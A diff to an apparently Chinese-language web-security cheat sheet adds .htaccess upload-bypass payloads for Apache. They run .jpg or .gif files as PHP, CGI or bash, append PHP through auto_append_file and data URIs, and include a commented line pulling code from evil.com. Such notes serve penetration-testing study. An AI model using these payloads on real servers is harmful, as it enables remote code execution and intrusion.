@@ -47,6 +47,33 @@ Apache
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 当AllowOverride被启用时，上传启用解析规则的.htaccess
 
+::
+
+    AddType application/x-httpd-php .jpg
+
+::
+
+    php_value auto_append_file .htaccess
+    #<?php phpinfo();
+
+::
+
+    Options ExecCGI
+    AddHandler cgi-script .jpg
+
+::
+
+    Options +ExecCGI
+    AddHandler fcgid-script .gif
+    FcgidWrapper "/bin/bash" .gif
+
+::
+
+    php_flag allow_url_include 1
+    php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
+    #php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
+    #php_value auto_append_file https://evil.com/evil-code.txt
+
 CVE-2017-15715
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 %0A绕过上传黑名单
